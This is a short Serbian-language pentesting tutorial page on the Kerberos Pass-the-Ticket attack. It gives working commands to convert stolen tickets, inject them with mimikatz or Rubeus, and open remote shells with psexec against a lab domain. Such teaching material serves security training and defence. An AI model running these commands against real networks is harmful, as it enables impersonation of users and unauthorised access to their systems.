## Prebacivanje karte (PTT)

U metodi napada **Prebacivanje karte (PTT)**, napadači **kradu autentifikacionu kartu korisnika** umesto njihove lozinke ili vrednosti heša. Ova ukradena karta se zatim koristi za **preuzimanje identiteta korisnika**, sticanje neovlašćenog pristupa resursima i uslugama unutar mreže.


**Pročitajte**:

* [Sakupljanje karata sa Windows-a](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
* [Sakupljanje karata sa Linux-a](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Zamena karata između Linux-a i Windows-a na različitim platformama**

Alat [**ticket_converter**](https://github.com/Zer1t0/ticket\_converter) konvertuje formate karata koristeći samo samu kartu i izlazni fajl.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
U Windowsu se može koristiti [Kekeo](https://github.com/gentilkiwi/kekeo).

### Napad Pass The Ticket

{% code title="Linux" %}
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
{% code title="Windows" %}
```bash
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
{% endcode %}
